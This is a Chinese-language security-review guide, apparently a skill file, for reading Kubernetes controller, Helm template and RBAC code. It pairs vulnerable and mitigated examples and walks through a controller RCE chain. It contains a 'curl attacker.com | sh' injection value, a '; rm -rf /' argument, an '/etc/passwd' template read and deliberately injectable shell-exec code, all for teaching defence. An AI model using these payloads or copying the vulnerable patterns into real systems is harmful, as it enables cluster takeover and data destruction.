---
description: 阅读基础设施代码的方法论：YAML 清单、RBAC 绑定、Controller 协调循环、Go Template 与容器安全上下文。
tags: [infra, kubernetes, code-review, controller, helm]
---

# 基础设施代码理解 (Code Understander)

## 1. 专家直觉触发器 (Triggers)

当专家阅读基础设施相关代码时，以下模式会立即触发深度审查：

- **Reconcile 循环调用外部命令**：Go 代码中出现 `exec.Command("helm", ...)` 或 `exec.Command("kubectl", ...)`，且参数包含从对象规格中读取的字符串。
- **Go Template 使用 `tpl` 或 `template` 函数**：Helm Chart 中将用户输入作为子模板渲染，如 `{{ tpl .Values.extraConfig . }}`。
- **RBAC 绑定缺乏 namespace 限制**：`ClusterRoleBinding` 引用 `ServiceAccount` 时未限制命名空间，或 `RoleBinding` 绑定了 `ClusterRole`。
- **容器安全上下文硬编码为宽松模式**：YAML 中 `securityContext` 显式设置 `privileged: true`、`allowPrivilegeEscalation: true` 或 `capabilities.add: ["SYS_ADMIN"]`。
- **Webhook 的 `clientConfig` 使用 URL 而非 Service**：`clientConfig.url` 指向外部地址，意味着低权限用户若能修改 webhook 配置，即可将请求重定向到恶意端点。

这些触发器说明代码正在将“数据”与“控制”混合，违反了基础设施安全的基本边界。

## 2. 不可跳过的问题链 (Question Chain)

在阅读代码时，必须按以下顺序追问：

1. **用户输入从哪个字段进入代码？**  
   是 `obj.Spec.Image`、annotation、label，还是 ConfigMap 的 `data` 字段？输入是否经过校验？
2. **Reconcile 循环中是否存在外部调用？**  
   Controller 是否调用 shell 命令、HTTP 请求、云 SDK？调用参数是否完全由用户控制？
3. **Go Template 的渲染上下文包含哪些变量？**  
   `.Values` 的全部内容是否被注入？是否存在递归渲染（`tpl`）导致二次解析？
4. **RBAC 规则的粒度是否足够细？**  
   `resources` 是否使用了通配符？`verbs` 是否包含 `escalate`、`bind`、`impersonate`？
5. **安全上下文是否由用户定义而非平台强制？**  
   Pod 的 `securityContext` 是从用户提交的 YAML 原样复制，还是由 Controller/准入控制器强制覆盖？
6. **Webhook 的调用端点是否可信且不可篡改？**  
   `caBundle` 是否非空？URL 是否来自用户可写的配置（如 annotation）？

## 3. 攻击链闭合 (Attack Chain Closure)

理解基础设施代码的目标是定位“从数据到命令”的转换点。以下是一个 Controller RCE 的完整逻辑链：

**代码场景**：某 Operator 的 Reconcile 逻辑如下：

```go
func (r *Reconciler) Reconcile(ctx context.Context, req ctrl.Request) (ctrl.Result, error) {
    var app MyApp
    r.Get(ctx, req.NamespacedName, &app)
    cmd := exec.Command("helm", "upgrade", "--install", app.Name, app.Spec.ChartPath)
    cmd.Env = append(os.Environ(), "EXTRA="+app.Spec.ExtraEnv)
    return cmd.Run()
}
```

**步骤 1（输入识别）**：`app.Spec.ChartPath` 与 `app.Spec.ExtraEnv` 完全来自用户提交的 CR。
**步骤 2（注入分析）**：若用户设置 `ChartPath` 为 `mychart; curl attacker.com | sh`，由于 `exec.Command` 的参数是独立的，无法直接注入新的 shell 命令。但如果后续逻辑将命令拼接为字符串再传给 `/bin/sh -c`，则存在注入。
**修正场景**：若代码为 `exec.Command("/bin/sh", "-c", fmt.Sprintf("helm upgrade --install %s %s", app.Name, app.Spec.ChartPath))`，则直接存在命令注入。
**步骤 3（权限验证）**：即使参数拆分，若 `ExtraEnv` 被注入 `PATH` 或 `HELM_DRIVER`，可能劫持 `helm` 行为。
**步骤 4（影响确认）**：Controller 通常以 ServiceAccount 运行，拥有创建任意资源的权限。RCE 在 Controller Pod 内意味着获得 Controller 的 Token，进而可操纵整个集群。

**逻辑闭环**：如果 Controller 将用户输入拼接到 shell 命令字符串中，或将其作为环境变量传递给外部工具，则攻击者可以通过注入特殊字符或环境变量劫持执行流。因此，**用户输入进入 exec = 潜在的 Controller RCE**。

## 4. 代码示例 (Code Examples)

### 4.1 危险的 Controller Reconcile（漏洞模式）

```go
func (r *Reconciler) Reconcile(ctx context.Context, req ctrl.Request) (ctrl.Result, error) {
    var job BatchJob
    if err := r.Get(ctx, req.NamespacedName, &job); err != nil {
        return ctrl.Result{}, err
    }
    // 危险：用户输入直接拼接进 shell 命令
    script := fmt.Sprintf("process-data --input %s --output %s", job.Spec.Input, job.Spec.Output)
    cmd := exec.CommandContext(ctx, "/bin/sh", "-c", script)
    if err := cmd.Run(); err != nil {
        return ctrl.Result{}, err
    }
    return ctrl.Result{}, nil
}
```

**风险**：`job.Spec.Input` 若为 `; rm -rf /`，则直接执行恶意命令。

### 4.2 安全的 Controller Reconcile（缓解模式）

```go
func (r *Reconciler) Reconcile(ctx context.Context, req ctrl.Request) (ctrl.Result, error) {
    var job BatchJob
    if err := r.Get(ctx, req.NamespacedName, &job); err != nil {
        return ctrl.Result{}, err
    }
    // 安全：参数列表化，禁止 shell 解析
    cmd := exec.CommandContext(ctx, "process-data",
        "--input", job.Spec.Input,
        "--output", job.Spec.Output,
    )
    // 进一步限制环境，防止 PATH 劫持
    cmd.Env = []string{"PATH=/usr/local/bin:/usr/bin"}
    if err := cmd.Run(); err != nil {
        return ctrl.Result{}, err
    }
    return ctrl.Result{}, nil
}
```

**缓解**：使用参数列表而非 shell 字符串，并显式设置最小环境变量。

### 4.3 危险的 Helm 递归模板（漏洞模式）

```yaml
# templates/extra.yaml
{{ tpl .Values.extraManifests . }}
```

**风险**：`.Values.extraManifests` 可由用户完全控制，包含任意 Go Template 代码，可能读取文件系统（如 `{{ .Files.Get "/etc/passwd" }}`）或调用 Helm 内置函数泄露环境信息。

### 4.4 安全的 Helm 模板（缓解模式）

```yaml
# templates/extra.yaml
{{- if .Values.extraManifests }}
{{ .Values.extraManifests }}
{{- end }}
```

**缓解**：仅做原样输出，不进行二次模板解析。若必须动态渲染，应将用户输入放入严格的沙箱上下文，并禁用危险函数。

### 4.5 危险的 RBAC RoleBinding（漏洞模式）

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: admin-binding
  namespace: dev
subjects:
- kind: User
  name: alice
  apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
```

**风险**：在 `dev` 命名空间中将 `cluster-admin` 绑定给普通用户 `alice`，使其在该命名空间内拥有完全管理权限，且可能通过创建特权 Pod 逃逸到节点。

### 4.6 安全的 RBAC RoleBinding（缓解模式）

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: deployer-binding
  namespace: dev
subjects:
- kind: User
  name: alice
  apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: Role
  name: deployment-manager
  apiGroup: rbac.authorization.k8s.io
```

**缓解**：使用局部 `Role` 而非 `ClusterRole`，并严格限制动词与资源。
